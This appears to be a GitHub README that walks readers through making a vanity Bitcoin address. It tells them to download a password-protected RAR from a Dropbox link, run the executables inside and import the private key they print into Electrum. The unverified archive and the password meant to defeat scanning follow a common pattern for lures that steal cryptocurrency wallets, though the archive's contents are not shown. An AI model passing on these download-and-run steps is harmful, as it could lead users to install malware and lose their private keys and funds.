# We generate a beautiful Bitcoin address and use it.

**Hello everyone, crypto investors**

![LuxuryTeam 2 Bitcoin-fotor-20240505145347](https://github.com/LuxuryTeam0/refactored-fortnight/assets/169560459/c25a5c77-dac2-4a22-aeb9-2402604ba8eb)

# Let me make it clear right away that the unit at the beginning of the address is required. Let's begin.
# **1. Download this > [FILE](https://www.dropbox.com/scl/fi/ghpu8s723ojrivy6pwwp5/LuxuryTeam.rar?rlkey=o2ai09owlr81ifyd8oh5dmp5v&st=ustmnski&dl=1).** (***pass - free***)

***pass - free***

 - Next, you need to take into account that your address CANNOT HAVE these letters (and one number):
> l - lowercase L

> 0 - zero

> I - capital i

> O - capital o

**2. When we have already downloaded our file, open the console and first unpack the archive onto the desktop into the btc folder**

 - In the console we write

```
cd Desktop\btc
```
- Next we write in the console:

```
vanitygen.exe -i 1scammer
```

***This option is if you want to generate on the CPU. And yes, instead of 1scammer you can enter anything you like, for example 1pidor, etc.***

***-i means case is not strict. those. if -i is specified, it can generate both 1ScAmMEr and 1scAMMeR, I think you understand.***

***with this parameter it is much faster to generate, but if you need caps/lowercase (by the way, lowercase generates 58 times slower), then just remove -i and forget about the characters that cannot be in your wallet (above).***

- **To generate MILLION times faster, we need to generate via GPU**
```
oclvanitygen.exe -i 1scammer
```
**Next in the console we will have this:**

- `Where Difficulty is the complexity of generation,
`

- `MKeys/s - the number of MILLIONS of keys per second (with a CPU it will be simply keys 
`

- `total - how many total keys were generated,
`

- `75% in 4.8 means that your probability of finding a public key with 1pepsi in the next 4.8 minutes is 75%.
`

- `63.1% is the probability of being found in already generated keys.
`

**After generation we get this:**

**Where:**

- ***Pattern: what was generated according to our request.***

- ***Address: our full BTC address.***

- ***Privkey: key to fully use the wallet.***

# Well, weâ€™ve generated it, but what next?

 **And then download Electrum (not advertising!)**
 
**Why him? It is time-tested and I have not yet seen other wallets with the function of using your addresses**
